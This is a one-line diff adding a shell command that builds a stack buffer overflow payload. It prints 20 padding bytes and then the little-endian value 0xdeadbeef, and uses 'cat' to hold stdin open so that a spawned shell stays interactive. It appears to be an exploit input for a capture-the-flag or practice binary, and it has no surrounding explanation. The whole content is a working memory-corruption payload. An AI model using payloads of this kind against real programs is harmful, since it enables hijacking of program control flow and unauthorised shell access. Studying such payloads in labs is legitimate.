@@ -1,0 +1,1 @@
+(python -c 'print 20*"A" + "\xef\xbe\xad\xde"'; cat;)
